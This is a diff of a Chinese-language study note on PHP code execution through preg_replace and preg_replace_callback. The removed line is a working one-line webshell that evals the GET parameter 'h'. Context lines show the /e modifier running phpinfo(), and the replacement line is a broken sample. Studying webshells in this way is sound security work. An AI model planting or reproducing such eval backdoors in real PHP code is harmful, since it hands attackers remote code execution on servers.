@@ -6,7 +6,7 @@
 
 ```php
 <?php
-preg_replace_callback("/.*/",function ($a){@eval($a[0]);},$_GET["h"]);
+preg_replace_callback("/.*/e",'eval()','aaaa');
 ?>
 ```
 
@@ -98,8 +98,6 @@ preg_replace漏洞触发有两个前提：
    echo preg_replace('/tesxt/e', 'phpinfo()', 'just test'); 
    //这两种没有匹配上，所以返回值是第三个参数，不能执行命令
    ```
-
-
 
 ## 函数绕过
 
